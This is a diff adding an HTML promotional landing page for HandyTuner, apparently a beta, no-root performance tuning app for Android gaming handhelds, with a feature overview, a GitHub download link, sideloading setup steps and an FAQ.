@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HandyTuner - All-in-One Tuner for Android Gaming Handhelds</title>
+<meta name="description" content="HandyTuner is an all-in-one tuner for Android gaming handhelds. Get an in-game HUD and Quick Menu, per-game presets, AutoTDP, fan, battery and network tools powered by the built-in PULSE engine. No root required.">
+<meta name="keywords" content="HandyTuner, android tuner, android handheld, AutoTDP, AYN Odin 2 Portal, AYN Odin, Retroid Pocket, gaming handheld, no root, per-game presets, in-game HUD, PULSE engine, performance tuning">
+<meta name="author" content="Amry-admin">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1e3a8a">
+<link rel="canonical" href="https://github.com/Amry-admin/HandyTuner">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="HandyTuner">
+<meta property="og:title" content="HandyTuner - All-in-One Tuner for Android Gaming Handhelds">
+<meta property="og:description" content="In-game HUD and Quick Menu, per-game presets, AutoTDP, fan, battery and network tools with the PULSE engine built in. No root. Beta for the AYN Odin 2 Portal.">
+<meta property="og:url" content="https://github.com/Amry-admin/HandyTuner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="HandyTuner - All-in-One Tuner for Android Gaming Handhelds">
+<meta name="twitter:description" content="Squeeze more performance and battery out of your Android gaming handheld. No root required. Download HandyTuner today.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "HandyTuner",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Android",
+  "description": "All-in-one tuner for Android gaming handhelds with in-game HUD and Quick Menu, per-game presets, AutoTDP, fan, battery and network tools and the PULSE engine built in. No root.",
+  "url": "https://github.com/Amry-admin/HandyTuner",
+  "license": "https://www.gnu.org/licenses/old-licenses/gpl-2.0.html",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 36px 28px 32px 28px;
+    box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+    margin-bottom: 28px;
+    text-align: center;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    margin: 0 0 14px 0;
+    color: #0f172a;
+    letter-spacing: -0.5px;
+    font-weight: 800;
+  }
+  .subtitle {
+    font-size: 1.06rem;
+    color: #475569;
+    margin: 0 auto 26px auto;
+    max-width: 640px;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #2563eb 0%, #7c3aed 55%, #db2777 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.08rem;
+    padding: 16px 38px;
+    border-radius: 999px;
+    box-shadow: 0 8px 20px rgba(37, 99, 235, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(124, 58, 237, 0.38);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 12px;
+    font-size: 0.9rem;
+    color: #64748b;
+  }
+  h2 {
+    font-size: 1.42rem;
+    color: #0f172a;
+    margin: 42px 0 14px 0;
+    padding-left: 14px;
+    border-left: 5px solid #2563eb;
+    line-height: 1.35;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.1rem;
+    color: #1e293b;
+    margin: 26px 0 8px 0;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px 0; }
+  ul, ol { margin: 0 0 18px 0; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 26px 10px 26px;
+    box-shadow: 0 6px 20px rgba(15, 23, 42, 0.07);
+    margin-bottom: 24px;
+  }
+  .grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 18px;
+    margin-bottom: 8px;
+  }
+  .tile {
+    flex: 1 1 240px;
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 20px 22px;
+    box-shadow: 0 4px 14px rgba(15, 23, 42, 0.07);
+    border-top: 4px solid #7c3aed;
+  }
+  .tile h3 {
+    margin-top: 0;
+    font-size: 1.02rem;
+  }
+  .tile p {
+    font-size: 0.95rem;
+    color: #475569;
+    margin-bottom: 8px;
+  }
+  .steps li { margin-bottom: 14px; }
+  .callout {
+    background: #eef4ff;
+    border-left: 5px solid #2563eb;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 0 0 22px 0;
+    font-size: 0.97rem;
+    color: #1e3a8a;
+  }
+  .callout-amber {
+    background: #fff8e8;
+    border-left-color: #d97706;
+    color: #7c4a03;
+  }
+  a.text-link {
+    color: #2563eb;
+    text-decoration: none;
+    font-weight: 600;
+    border-bottom: 1px solid rgba(37, 99, 235, 0.35);
+  }
+  a.text-link:hover { border-bottom-color: #2563eb; }
+  code {
+    background: #eef2f7;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-size: 0.92em;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    color: #0f172a;
+  }
+  footer {
+    margin-top: 44px;
+    padding-top: 22px;
+    border-top: 1px solid #dbe2ec;
+    font-size: 0.9rem;
+    color: #64748b;
+    text-align: center;
+  }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .hero { padding: 28px 18px 26px 18px; }
+    h1 { font-size: 1.62rem; }
+    h2 { font-size: 1.25rem; }
+    .btn { display: block; padding: 16px 20px; }
+    .card { padding: 20px 18px 6px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="hero">
+    <h1>🎮 HandyTuner - Unlock More Speed and Battery on Your Handheld</h1>
+    <p class="subtitle">An all-in-one tuner for Android gaming handhelds: an in-game HUD and Quick Menu, per-game presets, AutoTDP, fan, battery and network tools, with the PULSE engine built in. No root required.</p>
+    <a class="btn" href="https://github.com/Amry-admin/HandyTuner">Get HandyTuner Now</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </header>
+
+  <div class="callout">
+    HandyTuner is currently in <strong>Beta</strong>. It has been tested on the <strong>AYN Odin 2 Portal</strong>, and support for more handhelds is planned. If something looks unusual on your device, that is expected during the beta period.
+  </div>
+
+  <h2>🚀 What Is HandyTuner?</h2>
+  <p>HandyTuner is a single app that pulls all of your handheld's performance and battery settings into one tidy place. Instead of digging through hidden menus, guesswork, and scattered tools, you open HandyTuner, pick a game, and let it handle the heavy lifting.</p>
+  <p>Everything runs without root. That means no complicated unlocking, no risky system changes, and no voided warranties. You install the app like any other Android application, grant a few permissions when asked, and you are ready to go.</p>
+  <p>Under the hood, the <strong>PULSE engine</strong> continuously watches how your games are running and adjusts the balance between speed and power use. The result is smoother frame rates in demanding titles and longer play sessions in lighter ones — automatically, without you babysitting sliders.</p>
+
+  <h2>✨ What You Get</h2>
+  <div class="grid">
+    <div class="tile">
+      <h3>In-Game HUD</h3>
+      <p>A clean on-screen overlay shows your frame rate, power draw, temperatures and clock speeds while you play, so you always know what your device is doing.</p>
+    </div>
+    <div class="tile">
+      <h3>Quick Menu</h3>
+      <p>Pull up a compact side menu during gameplay to switch profiles, change performance modes or toggle tools without leaving your game.</p>
+    </div>
+    <div class="tile">
+      <h3>Per-Game Presets</h3>
+      <p>Save a custom setup for each title. HandyTuner remembers your choices and applies them the moment that game launches.</p>
+    </div>
+    <div class="tile">
+      <h3>AutoTDP</h3>
+      <p>Automatically matches the power budget to what the game actually needs, trimming waste and stretching your battery further.</p>
+    </div>
+    <div class="tile">
+      <h3>Fan Tools</h3>
+      <p>Control the cooling fan curve so your handheld stays quiet during light play and stays cool during heavy sessions.</p>
+    </div>
+    <div class="tile">
+      <h3>Battery Tools</h3>
+      <p>Keep an eye on drain, charging behaviour and remaining play time, with clear readouts that are easy to understand.</p>
+    </div>
+    <div class="tile">
+      <h3>Network Tools</h3>
+      <p>Check connection quality, latency and stability before you join an online match, and spot problems early.</p>
+    </div>
+    <div class="tile">
+      <h3>PULSE Engine</h3>
+      <p>The built-in intelligence that ties it all together and keeps your device tuned in real time as your game changes.</p>
+    </div>
+  </div>
+
+  <h2>📥 Download and Setup</h2>
+  <div class="card">
+    <p>Visit this link to download the application:</p>
+    <p><a class="text-link" href="https://github.com/Amry-admin/HandyTuner">https://github.com/Amry-admin/HandyTuner</a></p>
+    <p>That page is the official home of HandyTuner. It is the only place you need to go to grab the app, and it is where every new beta build is published first.</p>
+
+    <h3>Step-by-step for a first-time user</h3>
+    <ol class="steps">
+      <li><strong>Open the link.</strong> Click or tap the download link above. It will open in your normal web browser. If you are on a Windows PC, this works exactly like any other website you visit.</li>
+      <li><strong>Find the download.</strong> On the page that opens, look for the download area. This is where the current version of HandyTuner is offered. Everything you need is linked from this single page.</li>
+      <li><strong>Get the file.</strong> Start the download and let it finish completely. A partially downloaded file will not work, so wait until the browser confirms the download is done.</li>
+      <li><strong>Move it to your handheld.</strong> If you downloaded on a Windows computer, connect your handheld to the PC with a USB cable, then copy the downloaded file across into the handheld's Downloads folder. If you opened the link directly on the handheld, it is already in the right place.</li>
+      <li><strong>Open the file on the handheld.</strong> On the handheld, open the Files app, go to Downloads, and tap the file. Android will ask whether you want to allow installing apps from this source — confirm it. This is the normal, expected prompt for any app installed outside an app store.</li>
+      <li><strong>Finish the install.</strong> Tap Install and wait for it to complete. You will then see a HandyTuner icon in your app drawer.</li>
+      <li><strong>Launch HandyTuner.</strong> Open the app and follow the short on-screen walkthrough. It will ask for the permissions it needs to read device sensors and display the overlay. Accept them so the HUD and Quick Menu can appear over your games.</li>
+    </ol>
+    <p class="btn-note" style="text-align:left; margin-top:18px;">Everything above is a one-time job. After that, HandyTuner is always one tap away.</p>
+  </div>
+
+  <h2>🎯 Your First Five Minutes</h2>
+  <p>Once HandyTuner is open, you do not need to understand any technical settings to get value from it. Start simple:</p>
+  <ul>
+    <li><strong>Let the app scan your device.</strong> On first launch, HandyTuner reads what your handheld is capable of and sets sensible defaults. Do not change anything yet.</li>
+    <li><strong>Turn on the HUD.</strong> Enable the in-game overlay so you can see what is happening while you play. Watching the numbers for a few minutes teaches you more than any guide.</li>
+    <li><strong>Play one game normally.</strong> Launch a game you know well and play for ten minutes with the HUD visible. You will quickly see where the device is working hard and where it is coasting.</li>
+    <li><strong>Save a preset.</strong> Give that game its own profile. From now on, HandyTuner applies it automatically at launch.</li>
+    <li><strong>Enable AutoTDP.</strong> Turn it on and let the PULSE engine take over the balancing act. Most people leave it on permanently.</li>
+  </ul>
+
+  <h2>🔧 Everyday Use</h2>
+  <h3>The Quick Menu</h3>
+  <p>During a game, open the Quick Menu to change settings instantly. You can swap profiles, nudge the power level or check temperatures without closing your game. This is the feature most people end up using dozens of times a session.</p>
+  <h3>Per-Game Presets in Practice</h3>
+  <p>A heavy 3D title might want maximum performance and an aggressive fan curve. A lightweight indie game might run perfectly at half the power and stay silent. HandyTuner lets you define both, then remembers which is which. Once your library is set up, you never think about it again.</p>
+  <h3>AutoTDP Explained Simply</h3>
+  <p>Your handheld has a power budget. Spending more than a game needs wastes battery and creates heat; spending less causes stutter. AutoTDP constantly nudges that budget up and down to match the moment, which is why it produces both cooler temperatures and longer play time.</p>
+
+  <h2>📱 Supported Devices</h2>
+  <p>HandyTuner is in beta and has been tested on the <strong>AYN Odin 2 Portal</strong>. Support for additional Android gaming handhelds is planned, including other AYN Odin models and popular devices in the Retroid Pocket family. If your device is not on the tested list, the app may still run, but some tools may behave differently while support is being added.</p>
+
+  <h2>❓ Common Questions</h2>
+  <h3>Do I need root?</h3>
+  <p>No. HandyTuner is designed to work on a completely stock, unmodified device. There is nothing to unlock and nothing to flash.</p>
+  <h3>Is anything permanent?</h3>
+  <p>No. Settings changed through HandyTuner can be reverted, and uninstalling the app returns your device to its normal behaviour.</p>
+  <h3>The overlay does not appear. What do I check?</h3>
+  <p>Open your handheld's settings, find the apps section, select HandyTuner, and confirm the permission to display over other apps is switched on. Then restart the app.</p>
+  <h3>Can I use it on a Windows PC?</h3>
+  <p>The link above is where you download HandyTuner. On a Windows computer, you use that page to obtain the file and then transfer it to your Android handheld, as described in the setup steps.</p>
+  <h3>How do I update?</h3>
+  <p>Return to the same download link, get the newest version, and install it over the old one. Your presets are kept.</p>
+
+  <h2>🛡️ A Note on Safety</h2>
+  <p>Always download HandyTuner from the official link on this page. Because the app works without root, it cannot make deep system changes, which keeps your handheld safe. If you ever want to remove it completely, simply uninstall it like any other app.</p>
+
+  <h2>📄 License</h2>
+  <p>HandyTuner is released under the GNU General Public License v2.0 (GPL-2.0). The source code is open and available for review, modification and redistribution under the terms of that license.</p>
+
+  <h2>🔗 Get Started</h2>
+  <p style="text-align:center;">
+    <a class="btn" href="https://github.com/Amry-admin/HandyTuner">Download HandyTuner</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </p>
+
+  <footer>
+    HandyTuner &middot; All-in-one tuner for Android gaming handhelds &middot; Beta &middot; No root required &middot; GPL-2.0
+  </footer>
+
+</div>
+</body>
+</html>
